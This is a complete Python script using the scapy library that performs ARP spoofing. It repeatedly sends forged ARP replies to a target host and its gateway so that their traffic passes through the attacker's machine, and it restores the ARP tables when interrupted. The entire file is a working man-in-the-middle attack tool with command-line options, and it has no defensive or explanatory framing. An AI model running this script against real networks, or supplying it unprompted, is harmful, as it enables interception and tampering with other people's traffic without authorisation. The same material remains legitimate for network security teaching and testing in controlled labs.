#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target-ip", dest="target_ip", help="Setup target IP")
    parser.add_argument("-g", "--gateway-ip", dest="gateway_ip", help="Setup gateway IP")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("[-] Target IP not specified. Use --help for more info.")
    elif not options.gateway_ip:
        parser.error("[-] Gateway IP not specified. Use --help for more info.")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip,
                       hwsrc=get_mac(source_ip))
    scapy.send(packet, count=4, verbose=False)


sent_pairs_count = 0
input_options = get_arguments()
try:
    while True:
        spoof(input_options.target_ip, input_options.gateway_ip)
        spoof(input_options.gateway_ip, input_options.target_ip)
        sent_pairs_count += 2
        print("\r[+] Packet pairs sent: " + str(sent_pairs_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Cleaning things up..")
    restore(input_options.target_ip, input_options.gateway_ip)
    restore(input_options.gateway_ip, input_options.target_ip)
    print("[+] All done, have a nice day!")
